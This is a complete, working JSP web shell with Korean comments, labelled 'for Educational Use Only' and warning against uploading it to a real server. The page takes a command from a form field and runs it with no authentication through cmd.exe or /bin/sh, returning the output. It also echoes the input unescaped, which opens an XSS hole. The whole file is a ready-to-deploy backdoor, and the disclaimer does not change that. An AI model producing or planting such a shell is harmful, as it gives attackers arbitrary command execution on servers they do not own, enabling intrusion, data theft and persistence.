<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*" %>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>JSP Web Shell (for Educational Use Only)</title>
    <style>
        body { background-color: #1e1e1e; color: #d4d4d4; font-family: 'Courier New', Courier, monospace; }
        .container { width: 80%; max-width: 900px; margin: 50px auto; padding: 20px; border: 1px solid #333; }
        input[type="text"] { width: 80%; padding: 8px; background-color: #333; border: 1px solid #555; color: #d4d4d4; }
        button { padding: 8px 15px; background-color: #007bff; border: none; color: white; cursor: pointer; }
        pre { background-color: #252526; padding: 15px; border: 1px solid #333; white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
    <div class="container">
        <h1>JSP Web Shell</h1>
        <p style="color: #ff4d4d;"><strong>경고:</strong> 학습 목적으로만 사용하세요. 실제 서버에 절대 업로드하지 마십시오.</p>
        
        <form method="post">
            <label for="cmd">명령어:</label>
            <input type="text" id="cmd" name="cmd" autofocus>
            <button type="submit">실행</button>
        </form>

        <%
        // POST 요청으로 'cmd' 파라미터가 전송되었는지 확인합니다.
        String command = request.getParameter("cmd");
        if (command != null && !command.isEmpty()) {
        %>
            <h3>실행된 명령어:</h3>
            <pre><%= command %></pre> <%-- htmlspecialchars와 유사한 처리를 위해 JSTL의 <c:out> 사용을 권장 --%>
            
            <h3>실행 결과:</h3>
            <pre>
<%
            // 명령어 실행 로직
            Process process = null;
            BufferedReader reader = null;
            StringBuilder output = new StringBuilder();
            try {
                // OS의 셸을 통해 명령어를 실행합니다.
                String os = System.getProperty("os.name").toLowerCase();
                if (os.contains("win")) {
                    process = Runtime.getRuntime().exec("cmd.exe /c " + command);
                } else {
                    process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", command});
                }

                // 명령어의 표준 출력(stdout)을 읽어옵니다.
                reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                // 명령어의 에러 출력(stderr)도 읽어옵니다.
                reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                process.waitFor();

            } catch (Exception e) {
                output.append("명령어 실행 중 에러 발생: ").append(e.getMessage());
            } finally {
                if (process != null) {
                    process.destroy();
                }
                if (reader != null) {
                    try { reader.close(); } catch (IOException e) {}
                }
            }
            // 결과를 화면에 출력합니다.
            out.println(output.toString());
%>
            </pre>
        <%
        }
        %>
    </div>
</body>
</html>